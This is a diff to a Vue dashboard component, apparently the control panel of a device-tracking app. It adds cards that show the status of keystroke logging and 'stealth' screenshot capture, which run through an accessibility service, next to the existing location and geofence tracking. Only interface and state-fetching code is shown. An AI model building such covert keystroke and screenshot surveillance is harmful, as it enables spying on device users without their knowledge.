@@ -59,6 +59,52 @@
         </div>
         <i-lucide:arrow-right class="card-chev" />
       </router-link>
+
+      <router-link to="/tracking-hub/keystrokes" class="hub-card key-card">
+        <div class="card-icon-wrap">
+          <i-lucide:keyboard class="card-icon" />
+          <span v-if="kState?.enabled" class="status-dot live" />
+        </div>
+        <div class="card-body">
+          <h3 class="card-title">{{ $t('hub_keystrokes_title') }}</h3>
+          <p class="card-desc">{{ $t('hub_keystrokes_desc') }}</p>
+          <div class="card-meta">
+            <span class="chip" :class="{ on: kState?.enabled }">
+              <i-lucide:circle-dot v-if="kState?.enabled" />
+              <i-lucide:circle v-else />
+              {{ kState?.enabled ? $t('streaming') : $t('off') }}
+            </span>
+            <span class="chip neutral">
+              <i-lucide:database />
+              {{ kState?.totalEntries || 0 }} {{ $t('entries') }}
+            </span>
+          </div>
+        </div>
+        <i-lucide:arrow-right class="card-chev" />
+      </router-link>
+
+      <router-link to="/tracking-hub/screenshots" class="hub-card shot-card">
+        <div class="card-icon-wrap">
+          <i-lucide:camera class="card-icon" />
+          <span v-if="sState?.enabled" class="status-dot live" />
+        </div>
+        <div class="card-body">
+          <h3 class="card-title">{{ $t('hub_screenshots_title') }}</h3>
+          <p class="card-desc">{{ $t('hub_screenshots_desc') }}</p>
+          <div class="card-meta">
+            <span class="chip" :class="{ on: sState?.enabled }">
+              <i-lucide:circle-dot v-if="sState?.enabled" />
+              <i-lucide:circle v-else />
+              {{ sState?.enabled ? $t('streaming') : $t('off') }}
+            </span>
+            <span class="chip neutral">
+              <i-lucide:image />
+              {{ sState?.totalShots || 0 }} {{ $t('shots') }}
+            </span>
+          </div>
+        </div>
+        <i-lucide:arrow-right class="card-chev" />
+      </router-link>
     </div>
 
     <div class="future-card">
@@ -72,7 +118,10 @@
 import { ref, onMounted, onUnmounted } from 'vue'
 import emitter from '@/plugins/eventbus'
 import { gqlFetch } from '@/lib/api/gql-client'
-import { locationTrackingStateGQL, geofencesGQL, geofenceEventsGQL } from '@/lib/api/query'
+import {
+  locationTrackingStateGQL, geofencesGQL, geofenceEventsGQL,
+  keystrokeStateGQL, stealthScreenshotStateGQL,
+} from '@/lib/api/query'
 
 interface ILocState {
   enabled: boolean
@@ -82,10 +131,14 @@ interface ILocState {
   totalPoints: number
   latest: any
 }
+interface IKState { enabled: boolean; accessibilityServiceConnected: boolean; bufferLimit: number; totalEntries: number }
+interface ISState { enabled: boolean; accessibilityServiceConnected: boolean; supportedByOs: boolean; intervalMin: number; keepCount: number; totalShots: number }
 
 const locState = ref<ILocState | null>(null)
 const fenceCount = ref(0)
 const recentEventCount = ref(0)
+const kState = ref<IKState | null>(null)
+const sState = ref<ISState | null>(null)
 
 async function refresh() {
   try {
@@ -102,6 +155,14 @@ async function refresh() {
       const oneDayAgo = Date.now() - 24 * 3600 * 1000
       recentEventCount.value = e.data.geofenceEvents.filter((x: any) => x.ts >= oneDayAgo).length
     }
+  } catch (_) {}
+  try {
+    const k = await gqlFetch<{ keystrokeState: IKState }>(keystrokeStateGQL, {})
+    if (!k.errors) kState.value = k.data.keystrokeState
+  } catch (_) {}
+  try {
+    const s = await gqlFetch<{ stealthScreenshotState: ISState }>(stealthScreenshotStateGQL, {})
+    if (!s.errors) sState.value = s.data.stealthScreenshotState
   } catch (_) {}
 }
 
@@ -121,17 +182,35 @@ function onLocUpdate(p: any) {
 }
 function onGeoEvent() { refresh() }
 function onGeoChanged() { refresh() }
+function onKeystrokeLogged(p: any) {
+  if (kState.value && p && typeof p.totalEntries === 'number') kState.value.totalEntries = p.totalEntries
+  else if (kState.value) kState.value.totalEntries++
+}
+function onShotCaptured(p: any) {
+  if (sState.value && p && typeof p.totalShots === 'number') sState.value.totalShots = p.totalShots
+  else if (sState.value) sState.value.totalShots++
+}
+function onKStateChanged() { refresh() }
+function onSStateChanged() { refresh() }
 
 onMounted(() => {
   refresh()
   emitter.on('location_update', onLocUpdate)
   emitter.on('geofence_event', onGeoEvent)
   emitter.on('geofences_changed', onGeoChanged)
+  emitter.on('keystroke_logged', onKeystrokeLogged)
+  emitter.on('screenshot_captured', onShotCaptured)
+  emitter.on('keystroke_state_changed', onKStateChanged)
+  emitter.on('screenshot_state_changed', onSStateChanged)
 })
 onUnmounted(() => {
   emitter.off('location_update', onLocUpdate)
   emitter.off('geofence_event', onGeoEvent)
   emitter.off('geofences_changed', onGeoChanged)
+  emitter.off('keystroke_logged', onKeystrokeLogged)
+  emitter.off('screenshot_captured', onShotCaptured)
+  emitter.off('keystroke_state_changed', onKStateChanged)
+  emitter.off('screenshot_state_changed', onSStateChanged)
 })
 </script>
 
@@ -199,6 +278,14 @@ onUnmounted(() => {
 .geo-card {
   background: linear-gradient(135deg, rgba(34,197,94,0.08), rgba(56,189,248,0.05));
   border-color: rgba(34,197,94,0.25);
+}
+.key-card {
+  background: linear-gradient(135deg, rgba(245,158,11,0.10), rgba(244,114,182,0.06));
+  border-color: rgba(245,158,11,0.28);
+}
+.shot-card {
+  background: linear-gradient(135deg, rgba(56,189,248,0.10), rgba(139,92,246,0.06));
+  border-color: rgba(56,189,248,0.28);
 }
 
 .card-icon-wrap {
